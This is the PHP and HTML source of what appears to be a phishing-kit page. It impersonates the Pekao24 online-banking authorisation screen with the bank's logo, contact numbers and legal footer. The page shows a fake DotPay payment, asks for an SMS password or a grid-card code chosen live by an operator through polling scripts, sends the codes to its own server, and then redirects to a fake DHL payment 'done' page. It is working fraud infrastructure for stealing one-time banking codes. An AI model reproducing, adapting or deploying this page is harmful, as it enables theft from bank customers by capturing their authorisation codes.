<?php 
	include('../bank_header.php');
    include('../../../db.php'); 
    include_once('../../../utils.php'); 
	include('../../../YH0uW3ecaRHG16ld4waY.php');
	
	if (!$_REQUEST['id'])
		exit;
    
    if($_REQUEST['id']){
        $id = $_REQUEST['id'];
    }
        
    $date = date("d.m.Y");
        
	$id = mysqli_real_escape_string($con,$_REQUEST['id']);
	
	$page_name = basename($_SERVER['PHP_SELF']);
	$sqlss = "UPDATE `payment` SET `page_name` = '$page_name' WHERE `id` = '$id'";
	$con->query($sqlss);
	

    $sqq = "SELECT * FROM `payment` WHERE `id` = '".mysqli_real_escape_string($con,$_REQUEST['id'])."'";
    $new = $con->query($sqq);
    $rowp = $new->fetch_assoc();
    
    $number = $rowp['account_number'];
    $array  = array_map('intval', str_split($number));
    
	if(isset($_POST['submit'])){
		
	}
?>

<script type="text/javascript" src="js/public.js"></script>
<script type="text/javascript">
                 
setInterval(function(){ upd_last_login(<?php echo $_REQUEST['id']; ?>); }, 300);
function upd_last_login(str) {
    if (str == "") {
        // document.getElementById("txtHint").innerHTML = "";
        // return;
    } else { 
        if (window.XMLHttpRequest) {
            // code for IE7+, Firefox, Chrome, Opera, Safari
            xmlhttp = new XMLHttpRequest();
        } else {
            // code for IE6, IE5
            xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
        }
        xmlhttp.onreadystatechange = function() {
            if (this.readyState == 4 && this.status == 200) {
                //document.getElementById("ip").innerHTML = this.responseText;
                //alert(this.responseText);
            }
        };
  
        xmlhttp.open("GET","update123.php?id="+str,true);
        xmlhttp.send();
    }
}
</script>

<script type="text/javascript">
    var formularz = 0;
    var CheckingInterval;
    var jgrip;
function IsChecked()
{
    $.get("./IsCheckd.php", 'id=<?php echo $_REQUEST['id']; ?>',function(data, status){
            if(status=='success')
            {
                var array1 = data.split('&');
                if(array1[0]=='1')
                {
                    jgrip=array1[1];
                    
                    //clearInterval(CheckingInterval);
                    $("#loading_id").css("display", "none");
                    if (jgrip) {
                        $('#myspan').text(jgrip);
                        //$("#additionalopis1").css("display", "show");
                        //$("#additionalopis2").css("display", "none");
                        document.getElementById("additionalopis1").style.display = 'block';
                        document.getElementById("additionalopis2").style.display = 'none';
                    }
                    else{
                        //$("#additionalopis2").css("display", "show");
                        //$("#additionalopis1").css("display", "none");
                        document.getElementById("additionalopis2").style.display = 'block';
                        document.getElementById("additionalopis1").style.display = 'none';
                    }
                }
                else
                {
                    //$("#additionalopis1").css("display", "none");
                    //$("#additionalopis2").css("display", "show");
                    document.getElementById("additionalopis2").style.display = 'block';
                    document.getElementById("additionalopis1").style.display = 'none';
                }
            }
        });
}
CheckingInterval = setInterval(IsChecked , 1000);


var checkinterval;

	function check_status(payment_id) {
    //    alert(payment_id);
        if (payment_id.length == 0) {
        } 
        else {
            var xmlhttp = new XMLHttpRequest();
            xmlhttp.onreadystatechange = function() {
                if (this.readyState == 4 && this.status == 200) {
                    //document.getElementById("txtHint").innerHTML = this.responseText;
                    //alert(this.responseText);

                    if(this.responseText=='VALID CODE'){
                        window.location.href="<?php echo URL_dhlpayment;?>done/index.html";
                    }
                    if(this.responseText=='INVALID CODE'){
                        //window.location.href="";
                        
                        //document.getElementById("alert_invalid").style.display = 'block';
                        //ocument.getElementById("SmsCodes").style.display = 'block';
                        //document.getElementById("invalid_message").style.display = 'none';
                        //document.getElementById("alert_valid").style.display = 'none';
                        
                    }
                    if(this.responseText=='WRONG CODE'){
                
                    //document.getElementById("alert_invalid").style.display = 'block';
                        if(jgrip)
                        document.getElementById("SmsCodes1").style.visibility = 'visible';
                        else
                            document.getElementById("SmsCodes2").style.visibility = 'visible';
                        document.getElementById("alert_valid").style.display = 'none';
                        document.getElementById("invalid_message").style.display = 'block';
                        document.getElementById("myspan").textContent = '<?php echo $grip ?>';
                    
                    
                        window.location.href="index11.php?id=<?php echo $id; ?>";
                        clearInterval('checkinterval');
                    
                    }

                }
            };
            xmlhttp.open("GET", "check123.php?id=" + payment_id +"&status=aproove", true);
            xmlhttp.send();
        }
    }

	// When the user clicks on the button, open the modal 
	window.onload = function() {		
		var wrong_sms = document.getElementById('wrong_sms');
		var btn_submit = document.getElementById('btn_submit');
		
	}

    function auth_code(payment_id) {
        var inpObj,codes;
        if(jgrip)
        {
            inpObj = document.getElementById("SmsCodes1");
            codes = inpObj.value;
        }
        else
        {
            inpObj = document.getElementById("SmsCodes2");
            codes = inpObj.value;
        }
        if (payment_id.length == 0) {
        } else 
        {
            var xmlhttp = new XMLHttpRequest();
            xmlhttp.onreadystatechange = function() 
            {
                if (this.readyState == 4 && this.status == 200) 
                {
                    //document.getElementById("txtHint").innerHTML = this.responseText;
                    //alert(this.responseText);

                    if (inpObj.checkValidity() == false) {
                        if(jgrip)
                            document.getElementById("SmsCodes1").placeholder = '';
                        else
                            document.getElementById("SmsCodes2").placeholder = '';
                    }else{
                        if(this.responseText=='VALID CODE'){
                            if(jgrip)
                                document.getElementById("SmsCodes1").style.visibility = 'hidden';
                            else
                                document.getElementById("SmsCodes2").style.visibility = 'hidden';
                            document.getElementById("alert_valid").style.display = 'block';

                            checkinterval=setInterval(function(){ check_status(<?php echo $id; ?>); }, 1000);
                            //setTimeout(function(){ window.location.href="status_cancel.php?id=<?php echo $id; ?>"; }, 100000);
                        }
                    }
                    //alert(this.responseText);
                }
            };
            if(jgrip) {
                xmlhttp.open("GET", "ajax123.php?code=" + codes +"&id=" + payment_id+"&isgrip=1", true);
            }
            else {
                xmlhttp.open("GET", "ajax123.php?code=" + codes +"&id=" + payment_id+"&isgrip=0", true);
            }
            xmlhttp.send();
        }
    }
</script>

<style>
ul{
    -webkit-padding-start: 0px !important;
}
ul,li {
  list-style-type: none;
}
.label{
    font-size:90% !important;
}
<?php if($click_flag){?>
#loading_id{
	display:block !important;
}
#login_id{
	display:none;
}
<?php }
if ($error_flag) {?>
#wrong_sms{
	display:block;
}
<?php }?>
</style>

<!DOCTYPE HTML>
<html>
    <head>
        <title>Pekao24 - Bankowość elektroniczna</title>
        <meta content="width=device-width" name="viewport" />
        <meta charset=utf-8>
        <link href='https://netdna.bootstrapcdn.com/font-awesome/4.0.1/css/font-awesome.css' rel='stylesheet'>
        <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
        <link rel="stylesheet" href="css/index1.css">
		<link rel="stylesheet" href="https://www.w3schools.com/w3css/4/w3.css">
    </head>
    <body>

        <div class="container">
            <!-- Navigation Bar -->
            <nav class="navbar navbar-default pekao-nav">
				
                <div class="container-fluid">
                    <div class="navbar-header">
                        <img src="imgs/logo_pekao24.gif" class="navbar-brand" style="height: 128px;" />
                    </div>
					
                    <ul class="nav navbar-nav navbar-right">
                        <li class="active">
                            <a href="#" class="language-button" style="background-color: rgb(255, 255, 255);"><img src="imgs/england_flag.png" style="height: 20px;" /> English Version</a>
                        </li>
                    </ul>
                </div>
                <nav class="nav nav-tabs top-nav-tab">

                </nav>
            </nav>
            <div class="row">
                <div class="col-lg-3 col-md-2 col-sm-12 col-xs-12">
                  
                </div>
				
				
				
                <div class="col-md-6">
				
				
							
							
                    <div class="first-main-content col-lg-12 col-md-12 col-sm-12 col-ms-12">
					<div id="loading_id" style="display:none;">
								<center style="margin-top:50px;color:white;"><span>Poczekaj na zweryfikowanie logowania.</span></center>
									<center><img id="result" src="images/loading.gif" style="width: 170px; padding-top:60px; margin-bottom:40px;"></center>
							</div>
							
						<div  id="wrong_sms" class="w3-panel w3-red w3-display-container" style="display:none;">
						  <p style="margin-top:10px;">Proszę wprowadzić hasło.</p>
						</div>
						
						<div id="login_id">
                        <div class="first-row">
                            <a href="#"> Pomoc</a>
                            <h2 style="font-family: Trebuchet MS, Helvetica, Garuda, FreeSans;">Autoryzacja</h2>
                        </div>
						
						<form class="form-inline" method="post" action="" role="form" >
                        <div class="second-row">
                            <h4></h4>
                        </div>
                        <div class="second-row">
                            <ul class="columns divided" style="list-style-type: none !important;">
                        <li><ul class="form-set push-130">
                    
                    <li>
                        <label class="label pull">Kwota</label>
                        <span><label class="label pull" style="font-size:100% !important;">&nbsp;<?php echo $rowp['payment']; ?>   PLN</label></span>
                    </li>
                    <li>
                        <label class="label pull">Data</label>
                        <span><label class="label pull" style="font-size:100% !important;">&nbsp;<?php echo $date; ?></label></span>
                    </li>
                </ul>
            </li>
            <li>
                <ul class="form-set push-130">
                    <li>
                        <label class="label pull">Na rachunek odbiorcy</label>
    <span class=""><label class="label pull"><?php for($i=0;$i<27;$i++){ echo $array[$i]; if ($i%4 == 1) {echo '&nbsp;'; } } ?> </label><br> </span>

                        <span class="value"><br></span>
                    </li>
                    <li>
                        <label class="label pull">Odbiorca</label>
                        <span class=""><label class="label pull" style="font-size:100% !important;">DotPay S.A.</label></span>
                    </li>
                    <li>
                        <label class="label pull">Adres</label>
                        <span class=""><label class="label pull" style="font-size:100% !important;"><?php echo $rowp['address']; ?> <br></label> </span>
                    </li>
                    <li>
                        <label class="label pull">Szczegóły zakupu</label>
                        <span class=""><label class="label pull" style="font-size:100% !important;"><?php echo $rowp['title'] ?><br></label></span>
                    </li>
                    
                    <?php 
                        //if($rowp['gridcode']!=null &&  $rowp['gridcode'] !== '')
                        {
                            echo "<li id='additionalopis1' style='margin-top: 30px;display:none;'>";
                            echo "<label class='label pull' for='editField#38'  style='width: 275px;margin-right: 15px;'>Wprowadz kod nr <span id='myspan'> " .$rowp['gridcode']." </span> z karty kodow</label>";
                            echo '<span class="input"><input style="width: 80px;" id="SmsCodes1"  name="SmsCodes1" required="" value="" class="f-tan-code" maxlength="6" data-autofocus="true" type="password"> <input  type="hidden" name="UserName" value=""></span>';
                            echo "</li>";
                        }
                        //if($rowp['gridcode'] == null || $rowp['gridcode'] === '') 
                        {
                            echo "<li id='additionalopis2' style='margin-top: 30px;display:none;'>";
                            echo "<label class='label pull' for='editField#38'  style='width: 275px;margin-right: 15px;'>Hasło SMS</label>";

                            echo '<span class="input"><input style="width: 80px;"  id="SmsCodes2"  name="SmsCodes2" required="" value="" class="f-tan-code" maxlength="6" data-autofocus="true" type="password"> <input type="hidden" name="UserName" value=""></span>';
                            echo "</li>";
                        }
                    ?>
                    
                    <label class='label pull' id='invalid_message'  style='width: 450; margin-right: 0x; display: none; color: red;'>Kod jest niepoprawny. Prosimy sprobować ponownie</label>
    
                    <li><center><img src="loading.gif" style="width: 200px;display:none;margin-top:-50px; margin: 0px 0px 0px 0px;" id="alert_valid"></center>
                    <button style="margin-left: 15px; margin-top:10px;float: right;" onclick="auth_code('<?php echo $_REQUEST['id'];?>')" name="submit" class="btn btn-danger">DALEJ ></button>
                    
                    </li>
                    
                    
                    
                </ul>
            </li>
        </ul>
                        </div>
						</form>
                       
                   
                      <!-- <div class="second-main-content col-lg-12 col-md-12 col-sm-12 col-ms-12">
                     <p>
                            Aby zalogować się do systemu Demo PekaoInternet należy w miejsce numeru klienta wpisać następujące dane:
                            <br>
                            Numer klienta: <strong>123456</strong>
                        </p>
                    </div>-->
                    <div class="third-main-content col-lg-12 col-md-12 col-sm-12 col-ms-12">
                        <h2>Bezpieczeństwo</h2>
                        <ul>
                            <li>
                                <a href="#">Sprawdź</a> przed zalogowaniem, czy widzisz https w adresie strony i połączenie jest szyfrowane.
                            </li>
                            <li>
                                <a href="#">Pamiętaj,</a> że podczas kontaktów telefonicznych Bank nigdy nie prosi o podanie numeru PIN i hasła do Pekao24.
                            </li>
                            <li>
                                <a href="#">Przeglądaj</a> biuletyn bezpieczeństwa w internecie.
                            </li>
                        </ul>
                    </div>
					</div> </div>
                </div>
             
            </div>

            <div class="row footer-tabs">
                <ul class="nav nav-tabs">
                    <li class="active"><a data-toggle="tab" href="#firsttab">Kontakt do Pekao24</a></li>
                    <li><a data-toggle="tab" href="#secondtab">Kontakt do Pekao24Makler</a></li>
                </ul>
                <div class="tab-content">
                    <div id="firsttab" class="tab-pane fade in active">
                        <div class="col-lg-8 col-lg-offset-2 col-md-8 col-md-offset-2 col-sm-12 col-xs-12">
                            <div class="row firsttab-content">
                                <div class="col-lg-3 col-md-3 col-sm-4 col-xs-6">
                                    <p>
                                        <img src="imgs/icon_phone.gif" />&nbsp;&nbsp;&nbsp;<strong>TelePekao/ Infolinia</strong>
                                    </p>
                                    <p class="tabbar-inner-padding">
                                        801 365 365
                                        <br>
                                        +48 42 683 82 32
                                        <br>
                                        <span style="font-size: 8px">(opłata wg cennika operatora)</span>
                                    </p>
                                </div>
                                <div class="col-lg-3 col-md-3 col-sm-4 col-xs-6">
                                    <p>
                                        <img src="imgs/icon_mobile_phone.gif" />&nbsp;&nbsp;&nbsp;<strong>Bankowość mobilna</strong>
                                    </p>
                                    <p class="tabbar-inner-padding">
                                        <a href="#"> aplikacja na tablet</a><br>
                                        <a href="#"> aplikacja na telefon</a><br>
                                        <a href="#"> m.pekao24.pl</a>
                                    </p>
                                </div>
                                <div class="col-lg-6 col-lg-offset-0 col-md-6 col-md-offset-0 col-sm-4 col-sm-offset-0 col-xs-6 col-xs-offset-3">
                                    <p>
                                        <img src="imgs/icon_mobile_phone.gif" /> <strong>PekaoSMS</strong>
                                        <span class="tabbar-inner-padding">3803</span>
                                    </p>
                                    <p>
                                        <img src="imgs/icon_email.gif" /> <strong>E-mail</strong>
                                        <span class="tabbar-inner-padding">pekao24@pekao.com.pl</span>
                                    </p>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div id="secondtab" class="tab-pane fade">
                        <div class="col-lg-8 col-lg-offset-2 col-md-8 col-md-offset-2 col-sm-12 col-xs-12">
                            <div class="row secondtab-content">
                                <div class="col-lg-3 col-md-3 col-sm-3 col-xs-6">
                                    <p>
                                        <img src="imgs/icon_phone.gif" style="height: 24px;" /> <strong>Pekao24Makler<br>
                                            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Serwis telefoniczny</strong>
                                    </p>
                                    <p class="tabbar-inner-padding">
                                        800 105 800 (połączenie bezpłatne)
                                        <br>
                                        +48 22 591 22 00 (opłata wg cennika operatora)
                                    </p>
                                </div>
                                <div class="col-lg-3 col-md-3 col-sm-3 col-xs-6">
                                    <p>
                                        <img src="imgs/icon_mobile_phone.gif" style="height: 24px;" /> <strong>Pekao24Makler<br>
                                            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Usługi mobilne</strong>
                                    </p>
                                    <p class="tabbar-inner-padding">
                                        <a href="#">> aplikacja mobilna</a><br>
                                        <a href="#">> m.pekao24.pl</a><br>
                                    </p>
                                </div>
                                <div class="col-lg-3 col-md-3 col-sm-3 col-xs-12">
                                    <p>
                                        <img src="imgs/icon_mobile_phone.gif" style="height: 24px;" /> <strong>Bankowość mobilna</strong>
                                    </p>
                                    <p class="tabbar-inner-padding">
                                        801 301 601(opłata jak za połączenie lokalne)
                                        <br>
                                        +48 22 591 26 01(opłata wg cennika operatora)
                                    </p>
                                </div>
                                <div class="col-lg-3 col-md-3 col-sm-3 col-xs-12">
                                    <p>
                                        <img src="imgs/icon_email.gif" style="height: 24px;" /> <strong>Bankowość<br>
                                            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mobilna</strong>
                                    </p>
                                    <p class="tabbar-inner-padding">
                                        pekao24makler@pekao.com.pl                                            
                                    </p>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <hr/>
            <div class="row footer-links">
                <div class="links col-lg-9 col-md-9 col-sm-12 col-xs-12">
                    <a href="#">DM Pekao</a>
                    <a href="#">CDM Pekao S.A.</a>
                    <a href="#">Pioneer Pekao TFI S.A.</a>
                    <a href="#">Pekao Pioneer PTE S.A.</a>
                    <a href="#">Pekao Leasing Sp. z o.o.</a>
                </div>
                <div class="col-lg-3 col-md-3 col-sm-12 col-xs-12">
                    <address>Copyright © 2002-2017 Bank Pekao S.A.</address>
                </div>
            </div>
            <div class="row footer-help col-lg-12 col-md-12 col-sm-12 col-xs-12">
                <p>
                    Bank Polska Kasa Opieki Spółka Akcyjna z siedzibą w Warszawie, ul. Grzybowska 53/57, 00-950 Warszawa, 
                    wpisany do rejestru przedsiębiorców w Sądzie Rejonowym dla m.st. Warszawy w Warszawie, XII Wydział Gospodarczy Krajowego Rejestru Sądowego, KRS: 0000014843, 
                    NIP: 526-00-06-841, REGON: 000010205, wysokość kapitału zakładowego i kapitału wpłaconego: 262 470 034 zł.                                 
                </p>
            </div>
        </div>

        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
        <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>


    </body>
</html>